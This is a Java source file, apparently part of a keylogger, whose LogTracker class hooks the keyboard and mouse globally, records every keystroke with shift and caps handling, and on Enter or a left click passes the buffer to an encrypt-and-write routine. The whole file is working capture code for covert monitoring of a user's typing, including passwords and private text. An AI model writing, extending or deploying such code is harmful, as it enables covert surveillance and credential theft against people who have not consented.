package data.input;

import data.output.LogWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import lc.kra.system.mouse.GlobalMouseHook;
import lc.kra.system.mouse.event.GlobalMouseAdapter;
import lc.kra.system.mouse.event.GlobalMouseEvent;

public class LogTracker {

    private static StringBuilder log = new StringBuilder("");
    private static boolean isCaps = false;

    public static void run() {
        new GlobalKeyboardHook().addKeyListener(new GlobalKeyAdapter() {
            @Override
            public void keyPressed(GlobalKeyEvent event) {
                switch (event.getVirtualKeyCode()) {
                    case GlobalKeyEvent.VK_BACK:
                        log.deleteCharAt(log.length() - 1);
                        break;
                    case GlobalKeyEvent.VK_RSHIFT:
                    case GlobalKeyEvent.VK_LSHIFT:
                    case GlobalKeyEvent.VK_CAPITAL:
                        isCaps = !isCaps;
                        break;
                    case GlobalKeyEvent.VK_RETURN: {
                        try {
                            exportString();
                        } catch (IOException ex) {
                        }
                    }
                        break;
                    default:
                        log.append(checkIfMakeUpper(event.getKeyChar()));
                        break;
                }
            }
            
            @Override
            public void keyReleased(GlobalKeyEvent event) {
                switch (event.getVirtualKeyCode()) {
                    case GlobalKeyEvent.VK_RSHIFT:
                    case GlobalKeyEvent.VK_LSHIFT:
                    isCaps = !isCaps;
                    break;
                }
            }
        });

        new GlobalMouseHook().addMouseListener(new GlobalMouseAdapter() {
            @Override
            public void mousePressed(GlobalMouseEvent event) {
                if (event.getButtons() == GlobalMouseEvent.BUTTON_LEFT) {
                    try {
                        exportString();
                    } catch (IOException ex) {
                        Logger.getLogger(LogTracker.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            }
        });
    }
    
    private static char checkIfMakeUpper(char c) {
        return isCaps ? Character.toUpperCase(c) : c;
    }

    private static void exportString() throws IOException {
        if (log.length() != 0) {
            LogWriter.writeLog(LogCleaner.cleanAndEncrypt(log.toString()));
        }
        log = new StringBuilder("");
    }
}
